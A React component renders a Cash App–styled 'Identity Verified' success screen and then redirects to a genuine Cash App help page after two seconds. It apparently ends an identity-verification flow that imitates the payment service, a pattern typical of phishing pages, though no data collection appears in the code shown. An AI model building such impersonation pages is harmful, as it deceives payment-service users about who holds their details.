import React, { useEffect } from 'react';
import { Check } from 'lucide-react';
import { motion } from 'framer-motion';

export function Success() {
  useEffect(() => {
    const timer = setTimeout(() => {
      window.location.href = 'https://cash.app/help/us/en-US/6508-why-do-i-need-to-verify-my-identity';
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-6 text-center">
      <motion.div
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ 
          type: "spring",
          stiffness: 260,
          damping: 20,
          delay: 0.2 
        }}
        className="w-24 h-24 bg-[#00D1FF] rounded-full flex items-center justify-center mb-8"
      >
        <Check size={48} className="text-white" strokeWidth={4} />
      </motion.div>

      <motion.div
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.5 }}
      >
        <h1 className="text-[32px] font-bold mb-4 tracking-tight">
          Identity Verified
        </h1>
        <p className="text-[#8a8a8a] text-[18px] max-w-[320px]">
          Your account is being secured. You will be redirected shortly.
        </p>
      </motion.div>

      <div className="mt-12">
        <div className="w-12 h-1 border-2 border-[#1A1A1A] border-t-[#00D1FF] rounded-full animate-spin mx-auto" />
      </div>
    </div>
  );
}
